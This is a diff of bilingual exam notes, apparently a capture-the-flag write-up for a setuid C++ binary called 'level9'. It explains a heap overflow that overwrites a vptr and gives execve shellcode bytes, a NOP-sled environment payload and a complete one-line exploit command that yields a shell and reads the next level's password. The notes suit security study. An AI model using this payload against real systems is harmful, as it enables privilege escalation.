@@ -1,116 +1,243 @@
 # Level9 - Exam Notes
 
 ## 1. Objective
-Obtenir un shell **bonus0**. Binaire C++ setuid bonus0 ; pas de system ni "/bin/sh" dans le binaire. Il faut exécuter du shellcode (ex. execve("/bin/sh")), par ex. dans l’environnement, et détourner l’appel virtuel vers cette adresse.
-
-**Concepts détaillés (schémas, GDB, NOP sled, payload) :** `level9/Ressources/concepts.md`.
+Get a **bonus0** shell. The binary is a C++ setuid program with no direct `system("/bin/sh")` in normal flow. The exploit uses heap overflow + virtual call hijack + shellcode in environment.
 
 ## 2. Copy the binary (extraction)
-Depuis l’hôte :
+From host:
 ```bash
-sshpass -p '<level9_password>' scp -o StrictHostKeyChecking=no -P 4242 level9@localhost:level9 ./level9.bin
+scp -P 4242 level9@localhost:level9 ./level9.bin
 ```
-Référence : `commands.md`, Recon / Extraction.
+
+## 3. Reconstructed vulnerability
+- `setAnnotation(first, argv[1])` does:
+```c
+memcpy(first + 4, argv[1], strlen(argv[1]));
+```
+(no bound)
+- Two `N` objects are adjacent on heap.
+- Overflow from `a->annotation` reaches `b->vptr`.
+- Virtual call later does:
+```c
+func = *(void **)b;   // b->vptr
+func(b, a);           // indirect call
+```
+
+## 4. Practical exploitation path (step-by-step)
+
+### 4.1 Shellcode research (reference)
+Use known shellcode instead of custom-made one:
+- Reference: [shell-storm shellcode-811](https://shell-storm.org/shellcode/files/shellcode-811.html)
+- Linux x86 `execve("/bin/sh")` — 28 bytes
+
+Bytes:
+```bash
+\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80
+```
+
+### 4.2 Shellcode address research (env + NOP sled)
+Store shellcode in environment with a large NOP sled:
+```bash
+env -i payload=$(python -c 'print "\x90"*1000+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"') ./level9 AAA
+```
+
+Why NOP sled:
+```bash
+[ shellcode ]
+        ↑
+        must land EXACTLY here ❌
+
+[ NOP NOP NOP NOP NOP NOP NOP NOP ][ shellcode ]
+  ↑         ↑           ↑
+  all these addresses work ✅
+```
+
+Helper to print env address:
+```c
+#include <stdio.h>
+#include <stdlib.h>
+
+int main(void)
+{
+    char *p = getenv("payload");
+    printf("payload at: %p\n", p);
+    return 0;
+}
+```
+
+Example:
+```bash
+scp -P 4242 helper.c level9@localhost:/tmp
+gcc /tmp/helper.c -o /tmp/helper
+env -i payload=$(python -c 'print "\x90"*1000 + "AAAA"') /tmp/helper
+# payload at: 0xbffffc03
+```
+
+`getenv("payload")` returns the beginning of the NOP sled. With 1000 NOPs, several nearby addresses are valid (`0xbffffc03`, `0xbffffc63`, ...).
+
+### 4.3 Find `a->annotation` address (`a + 4`)
+From `main` disassembly:
+```bash
+0x08048658 <+100>:  mov    %eax,0x14(%esp)   ; a
+0x08048660 <+108>:  mov    %eax,0x10(%esp)   ; b
+```
+
+In GDB:
+```bash
+(gdb) break *0x08048664
+(gdb) run AAA
+(gdb) x/wx $esp+0x14
+0xbffff724:     0x0804a008
+(gdb) x/wx $esp+0x10
+0xbffff720:     0x0804a078
+```
+
+So:
+- `a = 0x0804a008`
+- `a->annotation = a + 4 = 0x0804a00c`
+- little-endian: `\x0c\xa0\x04\x08`
+
+### 4.4 Understand the padding (`"B"*104`)
+Struct layout:
+```c
+typedef struct s_n {
+    void *vtable;          // 4 bytes
+    char annotation[100];
+    int value;             // 4 bytes
+} N;
+```
+
+Distance to reach `b->vptr` from start of `a` data:
+- `4 (a->vptr) + 100 (annotation) + 4 (value) = 108`
+- first 4 payload bytes are used for shellcode address at `a->annotation[0..3]`
+- remaining before `b->vptr`: `108 - 4 = 104`
+
+Payload logic:
+```bash
+"\x63\xfc\xff\xbf"   → shellcode address
+"B"*104              → padding
+"\x0c\xa0\x04\x08"   → a->annotation (a+4)
+```
+
+### 4.5 Validate redirection in GDB
+```bash
+(gdb) break *0x08048693
+(gdb) run $(python -c 'print "\x63\xfc\xff\xbf" + "B"*104 + "\x0c\xa0\x04\x08"')
+```
+Check:
+- `b->vptr == 0x0804a00c`
+- `*(0x0804a00c) == 0xbffffc63` (or chosen NOP sled address)
+- `call *%edx` jumps to shellcode.
+
+## 5. Final exploit command
+```bash
+env -i payload=$(python -c 'print "\x90"*1000+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"') ./level9 $(python -c 'print "\x63\xfc\xff\xbf" + "B"*104 + "\x0c\xa0\x04\x08"')
+```
+
+If env address differs on your VM, only replace the first 4 bytes (`\x63\xfc\xff\xbf`).
+
+## 6. Reproducible demo (evaluation)
+1. Start binary.
+2. Run payload command above.
+3. Once shell is obtained:
+```bash
+cat /home/user/bonus0/.pass
+```
+
+## 7. Oral defense points
+- Bug class: heap overflow in `memcpy` without bound.
+- Control point: overwrite `b->vptr` with `a->annotation`.
+- Jump target: first 4 bytes of `a->annotation` = shellcode address.
+- Why NOP sled: tolerant landing zone for jump imprecision.
+- Fix: bound copy to annotation size (`<= 100`) and avoid unsafe virtual-call target control.
+# Level9 - Exam Notes
+
+## 1. Objective
+Get a **bonus0** shell. C++ setuid bonus0 binary; no system nor "/bin/sh" in the binary. We must run shellcode (e.g. execve("/bin/sh")), e.g. in the environment, and hijack the virtual call to that address.
+
+**Detailed concepts (diagrams, GDB, NOP sled, payload):** `level9/Ressources/concepts.md`.
+
+## 2. Copy the binary (extraction)
+From the host:
+```bash
+scp -P 4242 level9@localhost:level9 ./level9.bin
+```
 
 ## 3. Binary-to-source translation (source reconstruction)
-- **Deux objets N (0x6c octets).** setAnnotation(premier, argv[1]) fait **memcpy(premier+4, argv[1], strlen(argv[1]))** sans borne. Appel virtuel : (*(second->vptr))(second, first). second = premier+0x6c ; le **vptr** du second est à l’offset 0 du second.
-- **Où ça peut casser :** l’overflow depuis le buffer d’annotation (premier+4) peut atteindre le second objet. Offset : 4 (vptr premier) + 100 (annotation) + 4 (membre int) = **108** octets pour écraser le **vptr** du second. Si on met **premier+4** dans second->vptr, l’appel lit *(premier+4) et saute à cette adresse. Si on place à premier+4 l’**adresse du shellcode** (ex. dans l’env), le call exécute notre code.
-- Source : voir `source` (C++ simplifié).
+- **Two N objects (0x6c bytes each).** setAnnotation(first, argv[1]) does **memcpy(first+4, argv[1], strlen(argv[1]))** with no bound. Virtual call: (*(second->vptr))(second, first). second = first+0x6c; the **vptr** of second is at offset 0 of second.
+- **Where it can break:** the overflow from the annotation buffer (first+4) can reach the second object. Offset: 4 (first vptr) + 100 (annotation) + 4 (int member) = **108** bytes to overwrite the **vptr** of second. If we put **first+4** in second->vptr, the call reads *(first+4) and jumps to that address. If we place the **shellcode address** at first+4 (e.g. in env), the call runs our code.
+- Source: see `source` (simplified C++).
 
 ## 4. Understanding where it can break (vulnerability hypothesis)
-- **Fonctions suspectes :** memcpy(this+4, src, strlen(src)) sans borne dans setAnnotation.
-- **Succès :** exécuter du shellcode. Pas de system dans le binaire → shellcode (ex. execve("/bin/sh")) dans l’environnement ; adresse stable sans ASLR.
-- **Hypothèse :** overflow ; second->vptr = premier+4 ; *(premier+4) = adresse du nopsled (env). Payload argv[1] : [4 octets = adresse shellcode] + [104 padding] + [4 octets = premier+4]. Les adresses à obtenir en GDB : premier+4 (binaire), adresse du nopsled (env).
+- **Suspicious functions:** memcpy(this+4, src, strlen(src)) with no bound in setAnnotation.
+- **Success:** run shellcode. No system in the binary → shellcode (e.g. execve("/bin/sh")) in the environment; stable address without ASLR.
+- **Hypothesis:** overflow; second->vptr = first+4; *(first+4) = nopsled address (env). Payload argv[1]: [4 bytes = shellcode address] + [104 padding] + [4 bytes = first+4]. Addresses to get in GDB: first+4 (binary), nopsled address (env).
 
 ## 5. GDB diagnosis step-by-step
 
-1. **Lancer GDB avec l’env contenant le shellcode**  
+1. **Start GDB with env containing the shellcode**
    ```bash
    export PAYLOAD=$(python -c 'print "\x90"*1000+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"')
    gdb -q ./level9.bin
    env -i payload=$PAYLOAD
    ```
 
-2. **Repérer l’appel virtuel et les objets**  
+2. **Locate the virtual call and objects**
    ```gdb
    disas main
-   ```  
-   Trouver : allocation des deux objets (new 0x6c), setAnnotation(premier, argv[1]), puis la séquence mov eax,[second]; mov eax,[eax]; mov edx,[eax]; **call edx**. Le vptr du second est à [second+0] ; la cible du call est [vptr+0] = *(second->vptr). Si on a écrasé second->vptr par premier+4, alors *(second->vptr) = *(premier+4) = notre adresse.
+   ```
+   Find: allocation of the two objects (new 0x6c), setAnnotation(first, argv[1]), then the sequence mov eax,[second]; mov eax,[eax]; mov edx,[eax]; **call edx**. The second's vptr is at [second+0]; the call target is [vptr+0] = *(second->vptr). If we overwrote second->vptr with first+4, then *(second->vptr) = *(first+4) = our address.
 
-3. **Breakpoint juste avant call edx**  
+3. **Breakpoint just before call edx**
    ```gdb
-   break *<adresse_call_edx>
+   break *0x08048693
    run $(python -c 'print "\x63\xfc\xff\xbf" + "B"*104 + "\x0c\xa0\x04\x08"')
-   ```  
-   (Adapter les adresses si besoin.) Vérifier : second->vptr doit valoir **0x0804a00c** (premier+4). Puis :  
+   ```
+   (Adjust addresses if needed.) Verify: second->vptr must be **0x0804a00c** (first+4). Then:
    ```gdb
    x/wx $edx
-   ```  
-   ou `x/wx 0x0804a00c` → doit contenir l’adresse du shellcode (ex. 0xbffffc63). Cela prouve que le call va sauter vers notre env.
+   ```
+   or `x/wx 0x0804a00c` → must contain the shellcode address (e.g. 0xbffffc63). This proves the call will jump to our env.
 
-4. **Adresse premier+4**  
-   Après `run` avec un argv[1] quelconque, l’objet premier est alloué (ex. 0x0804a008). **premier+4 = 0x0804a00c**. À noter pour le payload (derniers 4 octets de argv[1]).
+4. **Address first+4**
+   After `run` with any argv[1], the first object is allocated (e.g. 0x0804a008). **first+4 = 0x0804a00c**. Note for the payload (last 4 bytes of argv[1]).
 
-5. **Adresse du nopsled (env)**  
+5. **Nopsled address (env)**
    ```gdb
    run
-   # (le programme peut segfault ou quitter)
    x/500s environ
-   ```  
-   Ou après `run` avec un argument court : parcourir les chaînes d’env pour trouver **payload=** et noter une adresse **dans** la zone des NOPs (ex. **0xbffffc63**). Cette adresse peut varier selon la VM ; sans ASLR elle est stable. En little-endian : 63 fc ff bf → `\x63\xfc\xff\xbf`.
+   ```
+   Or after `run` with a short argument: scan env strings for **payload=** and note an address **inside** the NOP zone (e.g. **0xbffffc63**). This address may vary by VM; without ASLR it's stable. In little-endian: 63 fc ff bf → `\x63\xfc\xff\xbf`.
 
-6. **Offset 108**  
-   Vérifier en envoyant 108 octets + 4 octets (premier+4) : second->vptr doit être 0x0804a00c. Si on envoie 104 octets de padding entre l’adresse shellcode et l’adresse premier+4, total = 4+104+4 = 112 octets ; les octets 108–111 écrasent le vptr. Confirmé par le layout : 4+100+4 = 108.
+6. **Offset 108**
+   Verify by sending 108 bytes + 4 bytes (first+4): second->vptr must be 0x0804a00c. If we send 104 bytes of padding between the shellcode address and the first+4 address, total = 4+104+4 = 112 bytes; bytes 108–111 overwrite the vptr. Confirmed by layout: 4+100+4 = 108.
 
 ## 6. Exploit design and command explanation
 
-**Génération de la commande (converter.py) :**  
-`level9/Ressources/converter.py` prend l’adresse du shellcode (nopsled dans l’env, ex. 0xbffffc63) et **premier+4** (0x0804a00c) et produit la commande complète (env + argv). Adapter les adresses selon GDB (section 5).
+**Command generation (converter.py):**
+`level9/Ressources/converter.py` takes the shellcode address (nopsled in env, e.g. 0xbffffc63) and **first+4** (0x0804a00c) and produces the full command (env + argv). Adjust addresses from GDB (section 5).
 
-**Conception :** Overflow dans setAnnotation ; on écrase le **vptr** du second par **premier+4**. À l’appel virtuel, le programme lit la « vtable » à premier+4 : la première entrée est *(premier+4). On y met l’**adresse du shellcode** (nopsled dans l’env). Donc call edx saute vers notre shellcode → shell.
+**Design:** Overflow in setAnnotation; we overwrite the **vptr** of second with **first+4**. At the virtual call, the program reads the "vtable" at first+4: the first entry is *(first+4). We put the **shellcode address** there (nopsled in env). So call edx jumps to our shellcode → shell.
 
-**Commande finale (`commands.md`, Exploitation) :**
+**Final command (see `commands.md`, Exploitation):**
 ```bash
 env -i payload=$(python -c 'print "\x90"*1000+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"') ./level9 $(python -c 'print "\x63\xfc\xff\xbf" + "B"*104 + "\x0c\xa0\x04\x08"')
 ```
-(Remplacer 0xbffffc63 par l’adresse trouvée en GDB si différente.)
+(Replace 0xbffffc63 with the address found in GDB if different.)
 
-**Origine des octets du shellcode :** shellcode **Linux x86 execve("/bin/sh") — 28 bytes** de Jean Pascal Pereira (shell-storm.org), référence : [shellcode-811](https://shell-storm.org/shellcode/files/shellcode-811.html). Il construit la chaîne "/bin//sh" sur la pile (push) puis appelle execve(ebx=esp, ecx=0, edx=0). Explication instruction par instruction : **level9/Ressources/shellcode_pas_a_pas.md**.
+**Shellcode bytes origin:** **Linux x86 execve("/bin/sh") — 28 bytes** by Jean Pascal Pereira (shell-storm.org), reference: [shellcode-811](https://shell-storm.org/shellcode/files/shellcode-811.html). It builds the string "/bin//sh" on the stack (push) then calls execve(ebx=esp, ecx=0, edx=0). Instruction-by-instruction explanation: **level9/Ressources/shellcode_pas_a_pas.md**.
 
-**Décomposition :**
+**Breakdown:**
 
-- **Invocation :** `env -i payload=...` pour un environnement propre contenant uniquement **payload** = nopsled (1000×\x90) + shellcode execve("/bin/sh"). `./level9 $(...)` passe le payload en argv[1].
+- **Invocation:** `env -i payload=...` for a clean environment containing only **payload** = nopsled (1000×\x90) + execve("/bin/sh") shellcode. `./level9 $(...)` passes the payload as argv[1].
 
-- **argv[1] — Partie 1 : 4 octets = adresse du nopsled (shellcode)**  
-  - Adresse trouvée en GDB (ex. **0xbffffc63**).  
-  - Little-endian : octet de poids faible en premier → 63, fc, ff, bf. En Python : `\x63\xfc\xff\xbf`.  
-  - Rôle : ces 4 octets sont à **premier+4**. Lors de l’appel virtuel, le programme lit *(premier+4) = cette adresse et saute vers elle (call edx) → exécution du nopsled puis du shellcode.
+- **argv[1] — Part 1: 4 bytes = nopsled (shellcode) address**
+  - Address from GDB (e.g. **0xbffffc63**). Little-endian: low byte first → 63, fc, ff, bf. In Python: `\x63\xfc\xff\xbf`. Role: these 4 bytes are at **first+4**. At the virtual call, the program reads *(first+4) = this address and jumps to it (call edx) → nopsled then shellcode run.
 
-- **argv[1] — Partie 2 : 104 octets 'B' (padding)**  
-  - Remplissent le reste du buffer d’annotation (100 - 4 = 96 ne suffisent pas ; on a 4+100+4 = 108 jusqu’au vptr, donc 108 - 4 = 104 octets de padding).  
-  - Ces octets écrasent la fin de l’annotation et le membre int du premier, puis le début du second, jusqu’à (mais pas inclus) le vptr du second.
+- **argv[1] — Part 2: 104 bytes 'B' (padding)**
+  - Fill the rest of the annotation buffer (108 - 4 = 104 bytes of padding to reach the vptr). These bytes overwrite the end of the annotation and the first object's int member, then the start of the second, up to (but not including) the second's vptr.
 
-- **argv[1] — Partie 3 : 4 octets = adresse premier+4 (nouveau vptr du second)**  
-  - Adresse : **0x0804a00c** (premier+4).  
-  - Little-endian : 0c, a0, 04, 08 → `\x0c\xa0\x04\x08`.  
-  - Rôle : second->vptr = 0x0804a00c. Au call virtuel, le programme fait mov eax, [second]; mov eax, [eax] (eax = 0x0804a00c); mov edx, [eax] (edx = *(premier+4) = notre adresse shellcode); call edx → saut vers le shellcode.
+- **argv[1] — Part 3: 4 bytes = address first+4 (new vptr of second)**
+  - Address: **0x0804a00c** (first+4). Little-endian: 0c, a0, 04, 08 → `\x0c\xa0\x04\x08`. Role: second->vptr = 0x0804a00c. At the virtual call, the program does mov eax, [second]; mov eax, [eax] (eax = 0x0804a00c); mov edx, [eax] (edx = *(first+4) = our shellcode address); call edx → jump to shellcode.
 
-Résumé : **\x63\xfc\xff\xbf** = adresse nopsled en LE (à premier+4) ; **104×'B'** = padding jusqu’au vptr ; **\x0c\xa0\x04\x08** = premier+4 en LE (vptr du second). Le call lit *(premier+4) et saute au shellcode.
-
-## 7. Reproducible procedure (for evaluation)
-- **Préparer :** PAYLOAD avec nopsled + shellcode (voir commands.md). En GDB, noter l’adresse du nopsled (`x/500s environ`).
-- **Commande :** `env -i payload=$PAYLOAD ./level9 $(python -c 'print "\x63\xfc\xff\xbf" + "B"*104 + "\x0c\xa0\x04\x08"')` puis `cat /home/user/bonus0/.pass`. Adapter \x63\xfc\xff\xbf si l’adresse GDB diffère.
-- **Résultat attendu :** shell bonus0.
-- **À dire :** « setAnnotation fait un memcpy sans borne ; j’écrase le vptr du second avec premier+4. À l’appel virtuel le programme lit *(premier+4) et y saute ; j’y mets l’adresse de mon shellcode dans l’env. »
-
-## 8. Oral defense points
-- **Bug :** memcpy(this+4, src, strlen(src)) dans setAnnotation sans borne ; overflow vers le second objet, écrasement du vptr.
-- **GDB :** offset 108, second->vptr = premier+4, *(premier+4) = adresse shellcode ; adresse nopsled via x/s environ.
-- **Payload :** [addr shellcode LE][104 padding][premier+4 LE]. Le programme lit la « vtable » à premier+4.
-- **Fix :** borner la copie (memcpy avec taille max).
-
-## 9. Common evaluator questions
-- **Pourquoi premier+4 dans le vptr ?** Pour que l’appel virtuel lise la cible à *(premier+4) ; on y met l’adresse du shellcode.
-- **Pourquoi le shellcode dans l’env ?** argv[1] sert à l’overflow ; l’env donne une adresse stable pour le nopsled (sans ASLR).
-- **Little-endian de 0xbffffc63 et 0x0804a00c ?** 63 fc ff bf → \x63\xfc\xff\xbf ; 0c a0 04 08 → \x0c\xa0\x04\x08.
-- **Offset 108 ?** 4 (vptr premier) + 100 (annotation) + 4 (membre int) = 108 jusqu’au vptr du second.
+Summary: **\x63\xfc\xff\xbf** = nopsled address in LE (at first+4); **104×'B'** = padding to the vptr; **\x0c\xa0\x04\x08** = first+4 in LE (second's vptr). The call reads *(first+4) and jumps to the shellcode.
